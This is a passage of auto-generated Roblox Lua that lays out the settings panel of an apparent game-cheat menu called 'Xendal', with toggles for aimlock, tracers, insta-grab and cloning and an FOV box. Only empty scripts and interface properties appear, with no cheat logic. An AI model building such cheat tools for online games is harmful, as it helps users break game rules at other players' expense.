G2L["241"]["TextSize"] = 14;
G2L["241"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["241"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["241"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["241"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["241"]["BackgroundTransparency"] = 1;
G2L["241"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["241"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["241"]["Text"] = [[]];
G2L["241"]["Name"] = [[Button]];
G2L["241"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder.Button.LocalScript
G2L["242"] = Instance.new("LocalScript", G2L["241"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder.UIPadding
G2L["243"] = Instance.new("UIPadding", G2L["23c"]);
G2L["243"]["PaddingTop"] = UDim.new(0, 4);
G2L["243"]["PaddingRight"] = UDim.new(0, 4);
G2L["243"]["PaddingLeft"] = UDim.new(0, 4);
G2L["243"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.AimlockToggle.Holder.UICorner
G2L["244"] = Instance.new("UICorner", G2L["23c"]);
G2L["244"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle
G2L["245"] = Instance.new("Frame", G2L["1bb"]);
G2L["245"]["BorderSizePixel"] = 0;
G2L["245"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["245"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["245"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["245"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["245"]["Name"] = [[TracersToggle]];
G2L["245"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Main Handler
G2L["246"] = Instance.new("LocalScript", G2L["245"]);
G2L["246"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder
G2L["247"] = Instance.new("Frame", G2L["245"]);
G2L["247"]["ZIndex"] = 2;
G2L["247"]["BorderSizePixel"] = 0;
G2L["247"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["247"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["247"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["247"]["Position"] = UDim2.new(0.459, 0, 0.46667, -2);
G2L["247"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["247"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder.Circle
G2L["248"] = Instance.new("Frame", G2L["247"]);
G2L["248"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["248"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["248"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["248"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["248"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["248"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder.Circle.Mini
G2L["249"] = Instance.new("Frame", G2L["248"]);
G2L["249"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["249"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["249"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["249"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["249"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["249"]["Name"] = [[Mini]];
G2L["249"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder.Circle.Mini.UICorner
G2L["24a"] = Instance.new("UICorner", G2L["249"]);
G2L["24a"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder.Circle.UICorner
G2L["24b"] = Instance.new("UICorner", G2L["248"]);
G2L["24b"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder.Button
G2L["24c"] = Instance.new("TextButton", G2L["247"]);
G2L["24c"]["BorderSizePixel"] = 0;
G2L["24c"]["TextSize"] = 14;
G2L["24c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["24c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["24c"]["BackgroundTransparency"] = 1;
G2L["24c"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["24c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["24c"]["Text"] = [[]];
G2L["24c"]["Name"] = [[Button]];
G2L["24c"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder.Button.LocalScript
G2L["24d"] = Instance.new("LocalScript", G2L["24c"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder.UIPadding
G2L["24e"] = Instance.new("UIPadding", G2L["247"]);
G2L["24e"]["PaddingTop"] = UDim.new(0, 4);
G2L["24e"]["PaddingRight"] = UDim.new(0, 4);
G2L["24e"]["PaddingLeft"] = UDim.new(0, 4);
G2L["24e"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.TracersToggle.Holder.UICorner
G2L["24f"] = Instance.new("UICorner", G2L["247"]);
G2L["24f"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle
G2L["250"] = Instance.new("Frame", G2L["1bb"]);
G2L["250"]["BorderSizePixel"] = 0;
G2L["250"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["250"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["250"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["250"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["250"]["Name"] = [[InstaGrabToggle]];
G2L["250"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Main Handler
G2L["251"] = Instance.new("LocalScript", G2L["250"]);
G2L["251"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Holder
G2L["252"] = Instance.new("Frame", G2L["250"]);
G2L["252"]["Visible"] = false;
G2L["252"]["ZIndex"] = 2;
G2L["252"]["BorderSizePixel"] = 0;
G2L["252"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["252"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["252"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["252"]["Position"] = UDim2.new(0.459, 0, 1.06667, -2);
G2L["252"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["252"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Holder.Circle
G2L["253"] = Instance.new("Frame", G2L["252"]);
G2L["253"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["253"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["253"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["253"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["253"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["253"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Holder.Circle.Mini
G2L["254"] = Instance.new("Frame", G2L["253"]);
G2L["254"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["254"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["254"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["254"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["254"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["254"]["Name"] = [[Mini]];
G2L["254"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Holder.Circle.Mini.UICorner
G2L["255"] = Instance.new("UICorner", G2L["254"]);
G2L["255"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Holder.Circle.UICorner
G2L["256"] = Instance.new("UICorner", G2L["253"]);
G2L["256"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Holder.Button
G2L["257"] = Instance.new("TextButton", G2L["252"]);
G2L["257"]["BorderSizePixel"] = 0;
G2L["257"]["TextSize"] = 14;
G2L["257"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["257"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["257"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["257"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["257"]["BackgroundTransparency"] = 1;
G2L["257"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["257"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["257"]["Text"] = [[]];
G2L["257"]["Name"] = [[Button]];
G2L["257"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Holder.UIPadding
G2L["258"] = Instance.new("UIPadding", G2L["252"]);
G2L["258"]["PaddingTop"] = UDim.new(0, 4);
G2L["258"]["PaddingRight"] = UDim.new(0, 4);
G2L["258"]["PaddingLeft"] = UDim.new(0, 4);
G2L["258"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.InstaGrabToggle.Holder.UICorner
G2L["259"] = Instance.new("UICorner", G2L["252"]);
G2L["259"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle
G2L["25a"] = Instance.new("Frame", G2L["1bb"]);
G2L["25a"]["BorderSizePixel"] = 0;
G2L["25a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25a"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["25a"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["25a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25a"]["Name"] = [[ClonerToggle]];
G2L["25a"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Main Handler
G2L["25b"] = Instance.new("LocalScript", G2L["25a"]);
G2L["25b"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Holder
G2L["25c"] = Instance.new("Frame", G2L["25a"]);
G2L["25c"]["Visible"] = false;
G2L["25c"]["ZIndex"] = 2;
G2L["25c"]["BorderSizePixel"] = 0;
G2L["25c"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["25c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["25c"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["25c"]["Position"] = UDim2.new(0.459, 0, 1.66667, -2);
G2L["25c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["25c"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Holder.Circle
G2L["25d"] = Instance.new("Frame", G2L["25c"]);
G2L["25d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25d"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["25d"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["25d"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["25d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["25d"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Holder.Circle.Mini
G2L["25e"] = Instance.new("Frame", G2L["25d"]);
G2L["25e"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["25e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["25e"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["25e"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["25e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["25e"]["Name"] = [[Mini]];
G2L["25e"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Holder.Circle.Mini.UICorner
G2L["25f"] = Instance.new("UICorner", G2L["25e"]);
G2L["25f"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Holder.Circle.UICorner
G2L["260"] = Instance.new("UICorner", G2L["25d"]);
G2L["260"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Holder.Button
G2L["261"] = Instance.new("TextButton", G2L["25c"]);
G2L["261"]["BorderSizePixel"] = 0;
G2L["261"]["TextSize"] = 14;
G2L["261"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["261"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["261"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["261"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["261"]["BackgroundTransparency"] = 1;
G2L["261"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["261"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["261"]["Text"] = [[]];
G2L["261"]["Name"] = [[Button]];
G2L["261"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Holder.UIPadding
G2L["262"] = Instance.new("UIPadding", G2L["25c"]);
G2L["262"]["PaddingTop"] = UDim.new(0, 4);
G2L["262"]["PaddingRight"] = UDim.new(0, 4);
G2L["262"]["PaddingLeft"] = UDim.new(0, 4);
G2L["262"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.ClonerToggle.Holder.UICorner
G2L["263"] = Instance.new("UICorner", G2L["25c"]);
G2L["263"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle
G2L["264"] = Instance.new("Frame", G2L["1bb"]);
G2L["264"]["BorderSizePixel"] = 0;
G2L["264"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["264"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["264"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["264"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["264"]["Name"] = [[BrokenToggle]];
G2L["264"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Main Handler
G2L["265"] = Instance.new("LocalScript", G2L["264"]);
G2L["265"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Holder
G2L["266"] = Instance.new("Frame", G2L["264"]);
G2L["266"]["Visible"] = false;
G2L["266"]["ZIndex"] = 2;
G2L["266"]["BorderSizePixel"] = 0;
G2L["266"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["266"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["266"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["266"]["Position"] = UDim2.new(0.459, 0, 2.26667, -2);
G2L["266"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["266"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Holder.Circle
G2L["267"] = Instance.new("Frame", G2L["266"]);
G2L["267"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["267"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["267"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["267"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["267"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["267"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Holder.Circle.Mini
G2L["268"] = Instance.new("Frame", G2L["267"]);
G2L["268"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["268"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["268"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["268"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["268"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["268"]["Name"] = [[Mini]];
G2L["268"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Holder.Circle.Mini.UICorner
G2L["269"] = Instance.new("UICorner", G2L["268"]);
G2L["269"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Holder.Circle.UICorner
G2L["26a"] = Instance.new("UICorner", G2L["267"]);
G2L["26a"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Holder.Button
G2L["26b"] = Instance.new("TextButton", G2L["266"]);
G2L["26b"]["BorderSizePixel"] = 0;
G2L["26b"]["TextSize"] = 14;
G2L["26b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["26b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["26b"]["BackgroundTransparency"] = 1;
G2L["26b"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["26b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["26b"]["Text"] = [[]];
G2L["26b"]["Name"] = [[Button]];
G2L["26b"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Holder.UIPadding
G2L["26c"] = Instance.new("UIPadding", G2L["266"]);
G2L["26c"]["PaddingTop"] = UDim.new(0, 4);
G2L["26c"]["PaddingRight"] = UDim.new(0, 4);
G2L["26c"]["PaddingLeft"] = UDim.new(0, 4);
G2L["26c"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.BrokenToggle.Holder.UICorner
G2L["26d"] = Instance.new("UICorner", G2L["266"]);
G2L["26d"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov
G2L["26e"] = Instance.new("Frame", G2L["1bb"]);
G2L["26e"]["BorderSizePixel"] = 0;
G2L["26e"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["26e"]["Size"] = UDim2.new(0, 325, 0, 44);
G2L["26e"]["Position"] = UDim2.new(0.01, 15, 0.75114, -5);
G2L["26e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26e"]["Name"] = [[Fov]];
G2L["26e"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.UICorner
G2L["26f"] = Instance.new("UICorner", G2L["26e"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.UIStroke
G2L["270"] = Instance.new("UIStroke", G2L["26e"]);
G2L["270"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.TextLabel
G2L["271"] = Instance.new("TextLabel", G2L["26e"]);
G2L["271"]["TextWrapped"] = true;
G2L["271"]["BorderSizePixel"] = 0;
G2L["271"]["TextSize"] = 14;
G2L["271"]["TextTransparency"] = 0.4;
G2L["271"]["TextScaled"] = true;
G2L["271"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["271"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["271"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["271"]["BackgroundTransparency"] = 1;
G2L["271"]["Size"] = UDim2.new(0, 43, 0, 39);
G2L["271"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["271"]["Text"] = [[|]];
G2L["271"]["Position"] = UDim2.new(0.28692, -5, 0, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.TextLabel
G2L["272"] = Instance.new("TextLabel", G2L["26e"]);
G2L["272"]["TextWrapped"] = true;
G2L["272"]["BorderSizePixel"] = 0;
G2L["272"]["TextSize"] = 14;
G2L["272"]["TextScaled"] = true;
G2L["272"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["272"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["272"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["272"]["BackgroundTransparency"] = 1;
G2L["272"]["Size"] = UDim2.new(0, 43, 0, 32);
G2L["272"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["272"]["Text"] = [[Fov]];
G2L["272"]["Position"] = UDim2.new(0.11718, -5, 0.12873, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig
G2L["273"] = Instance.new("Frame", G2L["26e"]);
G2L["273"]["BorderSizePixel"] = 0;
G2L["273"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["273"]["Size"] = UDim2.new(0.47152, 0, 0.76152, 0);
G2L["273"]["Position"] = UDim2.new(0.46182, 0, 0.11944, 0);
G2L["273"]["Name"] = [[FOVConfig]];
G2L["273"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.FOVSet
G2L["274"] = Instance.new("TextBox", G2L["273"]);
G2L["274"]["Name"] = [[FOVSet]];
G2L["274"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["274"]["TextWrapped"] = true;
G2L["274"]["TextSize"] = 14;
G2L["274"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["274"]["TextScaled"] = true;
G2L["274"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["274"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["274"]["PlaceholderText"] = [[70 - 120]];
G2L["274"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["274"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["274"]["Text"] = [[]];
G2L["274"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.UICorner
G2L["275"] = Instance.new("UICorner", G2L["273"]);
G2L["275"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV
G2L["276"] = Instance.new("Frame", G2L["273"]);
G2L["276"]["ZIndex"] = 2;
G2L["276"]["BorderSizePixel"] = 0;
G2L["276"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["276"]["Size"] = UDim2.new(0.945, 0, 0.63286, 0);
G2L["276"]["Position"] = UDim2.new(-0.39114, 0, 1.41715, 0);
G2L["276"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["276"]["Name"] = [[SetFOV]];
G2L["276"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.Animations
G2L["277"] = Instance.new("LocalScript", G2L["276"]);
G2L["277"]["Name"] = [[Animations]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.Animations.Sample
G2L["278"] = Instance.new("ImageLabel", G2L["277"]);
G2L["278"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["278"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["278"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["278"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["278"]["BackgroundTransparency"] = 1;
G2L["278"]["Name"] = [[Sample]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.UIGradient
G2L["279"] = Instance.new("UIGradient", G2L["276"]);
G2L["279"]["Rotation"] = -90;
G2L["279"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.UICorner
G2L["27a"] = Instance.new("UICorner", G2L["276"]);
G2L["27a"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.UIStroke
G2L["27b"] = Instance.new("UIStroke", G2L["276"]);
G2L["27b"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.Button
G2L["27c"] = Instance.new("TextButton", G2L["276"]);
G2L["27c"]["TextWrapped"] = true;
G2L["27c"]["TextTransparency"] = 0.2;
G2L["27c"]["TextSize"] = 14;
G2L["27c"]["TextScaled"] = true;
G2L["27c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["27c"]["BackgroundTransparency"] = 1;
G2L["27c"]["Size"] = UDim2.new(0.88096, 0, 0.6792, 0);
G2L["27c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["27c"]["Text"] = [[Set Fov]];
G2L["27c"]["Name"] = [[Button]];
G2L["27c"]["Position"] = UDim2.new(0.00741, 5, 0.13216, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.Button.LocalScript
G2L["27d"] = Instance.new("LocalScript", G2L["27c"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Visuals.ScrollingFrame.Fov.FOVConfig.SetFOV.Button.Animations
G2L["27e"] = Instance.new("LocalScript", G2L["27c"]);
G2L["27e"]["Name"] = [[Animations]];


-- StarterGui.Xendal.XendalInstaGrab
G2L["27f"] = Instance.new("Frame", G2L["1"]);
G2L["27f"]["BorderSizePixel"] = 0;
